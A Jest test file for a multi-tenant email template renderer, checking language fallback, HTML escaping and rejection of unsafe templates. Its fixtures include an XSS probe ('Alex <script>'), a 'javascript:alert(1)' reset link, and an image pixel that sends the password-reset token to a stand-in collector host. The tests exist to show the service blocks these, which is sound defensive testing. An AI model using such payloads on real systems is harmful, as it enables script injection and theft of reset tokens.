import { EMAIL_TEMPLATE_EVENTS, getEmailTemplateDefinition } from "@repo/email-templates";
import { SUPPORTED_LANGUAGES } from "@repo/shared";

import { EmailTemplateRenderingService } from "./email-template-rendering.service";
import { EmailTemplateValidationService } from "./email-template-validation.service";

import type { EmailTemplateAssetService } from "./email-template-asset.service";
import type { EmailTemplateRepository } from "../repositories/email-template.repository";
import type { TenantDbRunnerService } from "src/storage/db/tenant-db-runner.service";

describe("EmailTemplateRenderingService", () => {
  const definition = getEmailTemplateDefinition(EMAIL_TEMPLATE_EVENTS.PASSWORD_RECOVERY);
  const findPublishedEmailTemplate = jest.fn();
  const runWithTenant = jest.fn(async (_tenantId, callback) => callback());
  const resolveEmailTemplateAssets = jest.fn(async (document) => ({ document, attachments: [] }));
  const service = new EmailTemplateRenderingService(
    { findPublishedEmailTemplate } as unknown as EmailTemplateRepository,
    new EmailTemplateValidationService(),
    { resolveEmailTemplateAssets } as unknown as EmailTemplateAssetService,
    { runWithTenant } as unknown as TenantDbRunnerService,
  );
  const context = {
    event: definition.event,
    language: SUPPORTED_LANGUAGES.PL,
    variables: { name: "Alex <script>", reset_link: "https://tenant.example/reset?token=secret" },
  };
  const branding = {
    language: SUPPORTED_LANGUAGES.PL,
    companyName: "Tenant",
    primaryColor: "#123456",
  };

  beforeEach(() => {
    jest.clearAllMocks();
    findPublishedEmailTemplate.mockResolvedValue({
      subject: { en: "Reset for {{ name }}", pl: "Polski temat" },
      content: { en: definition.defaultDocuments.en },
      baseLanguage: SUPPORTED_LANGUAGES.EN,
    });
  });

  it("leaves the existing default untouched when no override is published", async () => {
    findPublishedEmailTemplate.mockResolvedValue(undefined);
    expect(
      await service.renderPublishedEmailTemplate("tenant-id", context, branding),
    ).toBeUndefined();
    expect(runWithTenant).toHaveBeenCalledWith("tenant-id", expect.any(Function));
    expect(findPublishedEmailTemplate).toHaveBeenCalledWith(definition.event);
    expect(resolveEmailTemplateAssets).not.toHaveBeenCalled();
  });

  it("falls back the whole email to base language and renders real escaped values", async () => {
    const result = await service.renderPublishedEmailTemplate("tenant-id", context, branding);
    expect(result?.subject).toBe("Reset for Alex <script>");
    expect(result?.html).toContain("Alex &lt;script&gt;");
    expect(result?.html).toContain(context.variables.reset_link);
    expect(result?.html).not.toContain("<script>");
    expect(result?.text).toContain("Alex <script>");
    expect(result?.subject).not.toContain("Polski");
  });

  it("rejects an unsafe real authentication URL even when sample validation passes", async () => {
    await expect(
      service.renderPublishedEmailTemplate(
        "tenant-id",
        { ...context, variables: { ...context.variables, reset_link: "javascript:alert(1)" } },
        branding,
      ),
    ).rejects.toThrow("emailTemplates.errors.httpsRequired");
  });

  it("rejects missing real authentication values", async () => {
    await expect(
      service.renderPublishedEmailTemplate(
        "tenant-id",
        { ...context, variables: { name: "Alex" } },
        branding,
      ),
    ).rejects.toThrow("emailTemplates.errors.missingMandatoryVariables");
  });
  it.each(["subject", "image"])(
    "rejects a persisted credential leak in %s before asset resolution",
    async (location) => {
      const document = structuredClone(definition.defaultDocuments.en);
      if (location === "image")
        document.content.push({
          type: "image",
          attrs: { src: "https://collector.example/pixel?token={{ reset_link }}", alt: "" },
        });
      findPublishedEmailTemplate.mockResolvedValue({
        subject: { en: location === "subject" ? "{{ reset_link }}" : "Reset" },
        content: { en: document },
        baseLanguage: SUPPORTED_LANGUAGES.EN,
      });
      await expect(
        service.renderPublishedEmailTemplate("tenant-id", context, branding),
      ).rejects.toThrow("emailTemplates.errors.restrictedAuthVariables");
      expect(resolveEmailTemplateAssets).not.toHaveBeenCalled();
    },
  );

  it("derives deadline wording in the actual fallback language", async () => {
    const reminder = getEmailTemplateDefinition(EMAIL_TEMPLATE_EVENTS.COURSE_DUE_DATE_REMINDER);
    findPublishedEmailTemplate.mockResolvedValue({
      subject: { en: reminder.subjects.en },
      content: { en: reminder.defaultDocuments.en },
      baseLanguage: SUPPORTED_LANGUAGES.EN,
    });
    const result = await service.renderPublishedEmailTemplate(
      "tenant-id",
      {
        event: reminder.event,
        language: SUPPORTED_LANGUAGES.PL,
        variables: {
          course_name: "Safety",
          course_link: "https://tenant.example/course",
          due_date: "2026-10-01",
          days_before_due_date: 0,
        },
      },
      branding,
    );
    expect(result?.text).toContain('The deadline to complete course "Safety" is today.');
  });
  it.each([
    EMAIL_TEMPLATE_EVENTS.USER_SHORT_INACTIVITY,
    EMAIL_TEMPLATE_EVENTS.USER_LONG_INACTIVITY,
  ])("uses platform wording in the fallback language for %s", async (event) => {
    const definition = getEmailTemplateDefinition(event);
    findPublishedEmailTemplate.mockResolvedValue({
      subject: { en: definition.subjects.en },
      content: { en: definition.defaultDocuments.en },
      baseLanguage: SUPPORTED_LANGUAGES.EN,
    });
    const result = await service.renderPublishedEmailTemplate(
      "tenant-id",
      {
        event,
        language: SUPPORTED_LANGUAGES.PL,
        variables: { course_name: "", course_link: "https://tenant.example/courses" },
      },
      branding,
    );
    expect(result?.text).toContain("on platform.");
    expect(result?.text).not.toContain("activity in .");
    expect(result?.html).not.toContain("{{");
    if (event === EMAIL_TEMPLATE_EVENTS.USER_SHORT_INACTIVITY) {
      expect(result?.subject).toBe("Continue your journey on the platform");
      expect(result?.text).toContain("OPEN PLATFORM");
    }
  });

  it("omits assignment deadline wording when the runtime date is absent", async () => {
    const definition = getEmailTemplateDefinition(EMAIL_TEMPLATE_EVENTS.USER_ASSIGNED_TO_COURSE);
    findPublishedEmailTemplate.mockResolvedValue({
      subject: { en: definition.subjects.en },
      content: { en: definition.defaultDocuments.en },
      baseLanguage: SUPPORTED_LANGUAGES.EN,
    });
    const result = await service.renderPublishedEmailTemplate(
      "tenant-id",
      {
        event: definition.event,
        language: SUPPORTED_LANGUAGES.PL,
        variables: { course_name: "Safety", course_link: "https://tenant.example/course" },
      },
      branding,
    );
    expect(result?.text).toContain("You now have access to Safety.");
    expect(result?.text).not.toContain("mandatory");
    expect(result?.html).not.toContain("{{");
  });
});
